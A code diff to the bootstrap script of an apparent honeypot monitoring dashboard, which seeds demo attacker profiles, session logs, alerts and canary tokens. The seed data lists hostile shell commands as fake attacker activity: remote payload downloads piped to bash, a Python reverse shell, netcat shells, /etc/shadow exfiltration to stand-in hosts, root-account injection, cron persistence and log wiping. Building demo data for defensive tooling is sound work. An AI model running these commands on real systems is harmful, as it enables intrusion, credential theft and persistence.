@@ -2,13 +2,14 @@ from __future__ import annotations
 
 import asyncio
 import logging
-from typing import Any
+import uuid
+from datetime import datetime, timedelta
 
-from sqlalchemy import select
+from sqlalchemy import func, select
 
-from config import Settings, get_settings
+from config import CAIRO_TZ, cairo_iso, Settings, get_settings
 from database import get_db_context, init_db
-from models import User
+from models import Alert, AttackerProfile, CanaryToken, SessionLog, User
 from services.auth import get_password_hash
 
 logger = logging.getLogger(__name__)
@@ -49,6 +50,214 @@ async def ensure_demo_user(session: Any, settings: Settings) -> bool:
     return True
 
 
+_DEMO_ATTACKERS = [
+    {"ip": "185.220.101.34", "country": "Germany", "city": "Berlin", "isp": "Tor Exit Node",
+     "threat_score": 0.92, "threat_level": 4, "vpn_detected": True, "canary_triggered": True},
+    {"ip": "45.33.32.156", "country": "United States", "city": "Dallas", "isp": "Linode LLC",
+     "threat_score": 0.68, "threat_level": 3, "vpn_detected": False, "canary_triggered": True},
+    {"ip": "103.235.46.91", "country": "China", "city": "Shanghai", "isp": "China Telecom",
+     "threat_score": 0.85, "threat_level": 4, "vpn_detected": True, "canary_triggered": False},
+    {"ip": "5.188.62.18", "country": "Russia", "city": "Moscow", "isp": "Petersburg Internet",
+     "threat_score": 0.74, "threat_level": 3, "vpn_detected": True, "canary_triggered": False},
+    {"ip": "91.134.208.77", "country": "France", "city": "Paris", "isp": "OVH SAS",
+     "threat_score": 0.55, "threat_level": 2, "vpn_detected": False, "canary_triggered": False},
+    {"ip": "181.214.206.189", "country": "Brazil", "city": "Sao Paulo", "isp": "Host1Plus",
+     "threat_score": 0.42, "threat_level": 2, "vpn_detected": False, "canary_triggered": False},
+    {"ip": "14.139.185.67", "country": "India", "city": "Mumbai", "isp": "BSNL",
+     "threat_score": 0.31, "threat_level": 1, "vpn_detected": False, "canary_triggered": False},
+    {"ip": "197.237.128.12", "country": "Kenya", "city": "Nairobi", "isp": "Safaricom",
+     "threat_score": 0.22, "threat_level": 1, "vpn_detected": False, "canary_triggered": False},
+    {"ip": "58.65.197.210", "country": "Pakistan", "city": "Karachi", "isp": "Cybernet",
+     "threat_score": 0.78, "threat_level": 3, "vpn_detected": True, "canary_triggered": True},
+    {"ip": "200.68.136.50", "country": "Mexico", "city": "Mexico City", "isp": "Telmex",
+     "threat_score": 0.48, "threat_level": 2, "vpn_detected": False, "canary_triggered": False},
+    {"ip": "178.128.200.87", "country": "Greece", "city": "Athens", "isp": "DigitalOcean",
+     "threat_score": 0.88, "threat_level": 4, "vpn_detected": True, "canary_triggered": True},
+    {"ip": "41.215.92.33", "country": "Nigeria", "city": "Lagos", "isp": "MTN Nigeria",
+     "threat_score": 0.65, "threat_level": 3, "vpn_detected": False, "canary_triggered": False},
+]
+
+_DEMO_COMMANDS_BY_LEVEL = {
+    0: ["ls", "pwd", "whoami"],
+    1: ["ls -la", "id", "uname -a", "cat /etc/passwd", "ps aux"],
+    2: ["wget http://malware.example.com/payload.sh", "chmod +x payload.sh",
+        "nmap -sS 192.168.1.0/24", "curl http://evil.cc/rat", "cat /etc/shadow",
+        "ssh user@10.0.0.5", "tftp -g -r backdoor 192.168.1.100"],
+    3: ["sudo su", "echo 'root::0:0:root:/root:/bin/bash' >> /etc/passwd",
+        "./payload.sh", "nc -e /bin/bash 10.0.0.1 4444",
+        "scp /etc/shadow attacker@remote:~/loot/", "crontab -l",
+        "wget http://c2.server/bot.sh -O /tmp/.hidden", "curl -X POST http://exfil.cc/data -d @/etc/shadow"],
+    4: ["rm -rf /var/log/*", "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'",
+        "iptables -F", "echo '*/5 * * * * /tmp/.persist.sh' | crontab -",
+        "base64 /etc/shadow | nc attacker.cc 1337",
+        "curl -s http://c2.server/ransomware | bash",
+        "systemctl disable firewalld", "cat /proc/1/environ | xargs -0 -n1 echo"],
+}
+
+
+async def seed_demo_data(session: Any, settings: Settings) -> None:
+    if not _demo_bootstrap_enabled(settings):
+        return
+
+    existing = await session.execute(select(func.count(AttackerProfile.ip)))
+    profile_count = existing.scalar()
+    if profile_count > 0:
+        logger.info("Demo data already exists (%d profiles), skipping seed", profile_count)
+        return
+
+    now = datetime.now(CAIRO_TZ).replace(tzinfo=None)
+    logger.info("Seeding demo attack data (%d attackers)...", len(_DEMO_ATTACKERS))
+
+    profiles: list[AttackerProfile] = []
+    for i, atk in enumerate(_DEMO_ATTACKERS):
+        first_seen = now - timedelta(hours=23 - i * 2)
+        profile = AttackerProfile(
+            ip=atk["ip"],
+            country=atk["country"],
+            city=atk["city"],
+            isp=atk["isp"],
+            vpn_detected=atk["vpn_detected"],
+            threat_score=atk["threat_score"],
+            threat_level=atk["threat_level"],
+            first_seen=first_seen,
+            last_seen=now - timedelta(minutes=(12 - i) * 10),
+            total_sessions=atk["threat_level"] + 1,
+            canary_triggered=atk["canary_triggered"],
+            canary_max_difficulty=atk["threat_level"] if atk["canary_triggered"] else 0,
+            canary_trigger_count=atk["threat_level"] if atk["canary_triggered"] else 0,
+            cumulative_canary_score=min(1.0, atk["threat_score"] - 0.2) if atk["canary_triggered"] else 0.0,
+        )
+        session.add(profile)
+        profiles.append(profile)
+
+    for profile in profiles:
+        level = profile.threat_level
+        sessions_to_create = max(1, level)
+        for s in range(sessions_to_create):
+            sid = str(uuid.uuid4())
+            start_time = profile.first_seen + timedelta(hours=s)
+            end_time = start_time + timedelta(minutes=10 + (level * 15))
+
+            cmds = _DEMO_COMMANDS_BY_LEVEL.get(level, _DEMO_COMMANDS_BY_LEVEL[1])
+            import random
+            selected_cmds = random.sample(cmds, min(len(cmds), level + 1 + s))
+            commands = [
+                {"timestamp": cairo_iso(start_time + timedelta(seconds=j * 30)),
+                 "command": cmd, "output": ""}
+                for j, cmd in enumerate(selected_cmds)
+            ]
+
+            session_log = SessionLog(
+                id=sid,
+                attacker_ip=profile.ip,
+                honeypot="cowrie" if s % 2 == 0 else "dionaea",
+                protocol="ssh" if s % 2 == 0 else "tcp",
+                start_time=start_time,
+                end_time=end_time,
+                commands=commands,
+                credentials_tried=[],
+                malware_hashes=[],
+                raw_log={"events": [{"eventid": "cowrie.session.connect", "timestamp": cairo_iso(start_time)}]},
+            )
+            session.add(session_log)
+
+            if level >= 3:
+                alert = Alert(
+                    id=uuid.uuid4(),
+                    session_id=sid,
+                    attacker_ip=profile.ip,
+                    threat_level=level,
+                    message=f"High-risk activity from {profile.ip}: {selected_cmds[0] if selected_cmds else 'suspicious commands'}",
+                    created_at=start_time + timedelta(minutes=5),
+                    acknowledged=level == 3,
+                )
+                session.add(alert)
+
+_CANARY_TOKENS = [
+    {
+        "id": "095a6bfa-9fbe-4a1f-b4fb-a1afa971cd98",
+        "label": "Public Web Bug",
+        "description": "Benign URL token — anyone can trigger, low value",
+        "token_kind": "url",
+        "difficulty": 0,
+        "score_value": 0.05,
+    },
+    {
+        "id": "19eee70f-aefd-4afb-ab06-3598d374876b",
+        "label": "Honeypot HTTP Banner",
+        "description": "Exposed tripwire HTTP server on port 8082",
+        "token_kind": "url",
+        "difficulty": 1,
+        "score_value": 0.15,
+    },
+    {
+        "id": "083ee719-79d9-4174-b471-076ecc4248d7",
+        "label": "Fake AWS Keys in Repo",
+        "description": "AWS keys planted in a public Git repo",
+        "token_kind": "aws_key",
+        "difficulty": 2,
+        "score_value": 0.25,
+    },
+    {
+        "id": "e8ca06a6-7123-4a08-9262-38c347248e51",
+        "label": "Staging Database Dump",
+        "description": "SQL backup left in /tmp/ on internal server",
+        "token_kind": "file",
+        "difficulty": 3,
+        "score_value": 0.40,
+    },
+    {
+        "id": "7aedcaf0-b627-4f6f-95e8-5e59d891147e",
+        "label": "Root SSH Private Key",
+        "description": "id_rsa planted in /root/.ssh/ — root-level breach",
+        "token_kind": "file",
+        "difficulty": 4,
+        "score_value": 0.60,
+    },
+]
+
+
+async def ensure_canary_tokens(session: Any) -> int:
+    seeded = 0
+    now = datetime.now(CAIRO_TZ).replace(tzinfo=None)
+    canonical_ids = {uuid.UUID(ct["id"]) for ct in _CANARY_TOKENS}
+
+    for ct in _CANARY_TOKENS:
+        existing = await session.get(CanaryToken, uuid.UUID(ct["id"]))
+        if existing is not None:
+            if existing.score_value == 0.0 and ct["score_value"] > 0:
+                existing.score_value = ct["score_value"]
+                seeded += 1
+            if not existing.is_active:
+                existing.is_active = True
+                seeded += 1
+            continue
+        token = CanaryToken(
+            id=uuid.UUID(ct["id"]),
+            label=ct["label"],
+            description=ct["description"],
+            token_kind=ct["token_kind"],
+            difficulty=ct["difficulty"],
+            score_value=ct["score_value"],
+            created_at=now - timedelta(days=1),
+            trigger_count=0,
+            is_active=True,
+        )
+        session.add(token)
+        seeded += 1
+
+    all_tokens = (await session.execute(select(CanaryToken))).scalars().all()
+    for t in all_tokens:
+        if t.id not in canonical_ids:
+            await session.delete(t)
+            seeded += 1
+            logger.info("Removed orphan token: %s (%s)", t.label, t.id)
+
+    if seeded:
+        logger.info("Seeded/updated %d canary tokens", seeded)
+    return seeded
+
+
 async def bootstrap_demo_user(settings: Settings | None = None) -> bool:
     current_settings = settings or get_settings()
     if not _demo_bootstrap_enabled(current_settings):
@@ -57,7 +266,11 @@ async def bootstrap_demo_user(settings: Settings | None = None) -> bool:
 
     init_db(current_settings.database_url)
     async with get_db_context() as session:
-        return await ensure_demo_user(session, current_settings)
+        result = await ensure_demo_user(session, current_settings)
+        await ensure_canary_tokens(session)
+        await seed_demo_data(session, current_settings)
+        await session.commit()
+        return result
 
 
 def main() -> None:
